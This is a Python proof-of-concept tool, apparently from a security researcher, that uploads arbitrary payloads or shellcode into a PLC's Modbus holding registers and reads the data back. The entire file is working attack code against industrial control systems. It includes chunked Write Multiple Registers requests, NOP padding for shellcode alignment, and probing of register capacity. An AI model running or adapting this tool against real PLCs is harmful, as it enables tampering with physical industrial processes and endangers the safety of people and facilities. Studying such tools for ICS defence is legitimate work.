#!/usr/bin/env python
import sys
import argparse
import socket
import os
import time
from random import randint

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[32m'
    RED = '\033[0;31m'
    DEFAULT = '\033[0m'
    GREY = '\033[90m'
    ORANGE = '\033[33m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'

TIMEOUT = 2
PORT = 502
# http://www.modbus.org/docs/Modbus_Application_Protocol_V1_1b.pdf
MAX_WORDS_READ = 125  # 7D
MAX_WORDS_WRITE = 123 # 7B
READ_HOLDING = "03"  # Read Holding Registers
WRITE_HOLDING = "10" # Write Multiple Registers


def banner():
    print Colors.RED + " __     __   __                                 "
    print              "|__)|  /    |__)_   | _  _  _|  | _ . _ _|_ _  _"
    print              "|   |__\__  |  (_|\/|(_)(_|(_|  || )|(-(_|_(_)| "
    print              "                  /                 /           "
    print              ">> Author: " + Colors.BLUE + "@BorjaMerino (www.shelliscoming.com) \n" + Colors.DEFAULT


def get_args():
    summary = 'Script to upload a payload/shellcode to a PLC.\n'

    parser = argparse.ArgumentParser(
        prog='plcInjectPayload.py.py',
        usage='%(prog)s <options> -ip <ip_addr>',
        description=summary)

    parser.add_argument('-upload', metavar='<payld.bin>', help='payload to upload to the PLC')
    parser.add_argument('-download', metavar='<n bytes>', help='download <n> bytes from the PLC.')
    parser.add_argument('-ip', metavar='<ip addr>', help='IP address',required=True)
    parser.add_argument('-size', metavar='<n bytes>', help='check if the PLC can allocate <n> bytes in its holding registers')
    parser.add_argument('-addr', metavar='<addr>', help='start address from which to upload/download data (0 if not set)', default=0)
    args = parser.parse_args()
    return args

# Just certain format to print the modbus data to stdout
def format_print(payload):
    modbus_tcp_s = ' '.join(payload[0:14][i:i + 2] for i in range(0, len(payload[0:14]), 2))
    modbus_s = ' '.join(payload[14:][i:i + 2] for i in range(0, len(payload[14:]), 2))
    return Colors.GREEN + modbus_tcp_s + Colors.BLUE + " " + modbus_s + Colors.DEFAULT


# Send payload to the PLC and return the response
def connection_plc(ip, payload, t_sleep=0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, PORT))
        print "    Data Tx: " + format_print(payload)
        s.send(payload.decode("hex"))
        resp = s.recv(500)
        # Silly check. Enough for the Poc
        if resp.encode("hex")[0:4] != payload[0:4]:
            print Colors.RED + "[-] Something was wrong with the answer, the Transaction Id doesn't mach: %s" \
                               % (resp.encode('hex')[0:4]) + Colors.DEFAULT
            sys.exit(1)
        print "    Data Rx: " + format_print(resp.encode('hex')) + "\n"
    except Exception as e:
        print Colors.RED + "[-] Something was wrong with %s:%d. Exception: %s" % (ip, PORT, e) + Colors.DEFAULT
        sys.exit(1)

    s.close()
    time.sleep(t_sleep)
    return resp


# Return a string with the modbus header
def create_header_modbus(length):
    trans_id = format(randint(0, 65535), '04x')
    proto_id = "0000"
    unit_id = "01"
    return trans_id + proto_id + length + unit_id


# Check if the plc has enough space to store "size" bytes
def check_size(size,ip):
    ref_num = format(size / 2, '04x') # Each Holding register store 2 bytes
    word_count = "0001" # Just read one word
    payload = create_header_modbus("0006") + READ_HOLDING + ref_num + word_count

    print Colors.ORANGE + "[?] Checking if the PLC %s has enough size in its holding registers " % ip + Colors.DEFAULT
    resp = connection_plc(ip,payload,t_sleep=1) # 1 sec sleep to avoid some ack/rst (some PLCs behave strangely)

    if resp.encode('hex')[14:16] == '83': # Exception Read Holding Registers.
        print Colors.RED + "[-] Exception Read Holding Registers. Not size available :/" + Colors.DEFAULT
        return False
    else:
        print Colors.ORANGE + Colors.BOLD + "[+] It seems there are enough size :D" + Colors.DEFAULT
        return True


# Download n bytes from a PLC. If -addr is supplied it will start to download the data from that holding register
def download_data(size, ip, addr):

    file_bin = 'data_download.bin'
    words = size / 2

    # Check if it has to read an additional holding register
    if size % 2 != 0:
        words += 1

    # Check if there are space enough
    if not check_size(size + addr*2, ip):
        sys.exit(1)

    word_count = format(MAX_WORDS_READ, '04x')
    ref_num = format(addr, '04x')

    fw = open(file_bin, 'wb')
    requests = words / MAX_WORDS_READ # 125 is the max number of words (250 bytes) than can be retrieved for each read request

    print Colors.ORANGE + "[?] Downloading %d bytes from address %d... " % (size,addr) + Colors.DEFAULT

    for i in range(requests):
        payload = create_header_modbus("0006") + READ_HOLDING + ref_num + word_count
        resp = connection_plc(ip, payload)
        # I dont' check if the reply is ok from here. I'm lazy (be sure to check it from the stager)
        fw.write(resp[9:]) # From offset 9 start the payload
        ref_num = format(int(ref_num,16) + MAX_WORDS_READ, '04x')

    mod = words % MAX_WORDS_READ
    if mod != 0:
        payload = create_header_modbus("0006") + READ_HOLDING + ref_num + format(mod, '04x')
        resp = connection_plc(ip, payload)
        fw.write(resp[9:])

    print Colors.ORANGE + Colors.BOLD + "[+] Data saved it to: %s" % file_bin + Colors.DEFAULT
    fw.close()


# Upload a shellcode to the PLC. If -addr is supplied it will start to download the data from that holding register
def upload_payload(file, ip, addr):
    padding =""
    try:
        f = open(file, "rb")
    except (IOError, OSError) as e:
        print Colors.RED + "[-] Exception: %s" % (e) + Colors.DEFAULT
        sys.exit(1)

    ref_num = format(addr, '04x')
    size_payload = os.path.getsize(file)
    print Colors.ORANGE + "[+] %s file size: %d bytes" % (file,size_payload) + Colors.DEFAULT

    # Check if there are space enough
    if not check_size(size_payload + addr*2, ip):
        sys.exit(1)

    words = size_payload / 2
    # Check if it has to read an additional holding register
    if size_payload % 2 != 0:
        words += 1
        padding = "90" # add a nop when the number of bytes is odd (since it has to be alinged to a word)

    word_count = format(MAX_WORDS_WRITE, '04x')
    ref_num = format(addr, '04x')

    print Colors.ORANGE + "[?] Uploading the payload (%d bytes) from address %d... " % (size_payload,addr) + Colors.DEFAULT
    requests = words / MAX_WORDS_WRITE

    for i in range(requests):
        nbytes_to_write = MAX_WORDS_WRITE*2
        length_packet = 7 + nbytes_to_write # 7 = Unit Identifier (1) + Function Code (1) + Ref Num (2) + Word Count (2) + Lenght (1)

        # HEADER + Function Code + Reference Number + Word Count + Byte Count. With Scapy this would be clearer :S
        payload = create_header_modbus(format(length_packet, '04x')) + WRITE_HOLDING + ref_num + word_count + format(nbytes_to_write, '02x') \
                  + f.read(nbytes_to_write).encode("hex")

        resp = connection_plc(ip, payload)
        ref_num = format(int(ref_num,16) + MAX_WORDS_WRITE, '04x')

    mod = words % MAX_WORDS_WRITE
    if mod != 0:
        length_packet = 7 + mod*2
        payload = create_header_modbus(format(length_packet, '04x')) + WRITE_HOLDING + ref_num + format(mod, '04x') + format(mod*2, '02x')\
                  + f.read(mod*2).encode("hex") + padding

        resp = connection_plc(ip, payload)

    print Colors.ORANGE + Colors.BOLD + "[+] Payload %s uploaded" % file + Colors.DEFAULT
    f.close()


def main():
    banner()
    args = get_args()

    if args.download:
          download_data(int(args.download), args.ip, int(args.addr))

    if args.upload:
          upload_payload(args.upload, args.ip, int(args.addr))

    if args.size:
          size = check_size(int(args.size),args.ip)


if __name__ == '__main__':
    main()
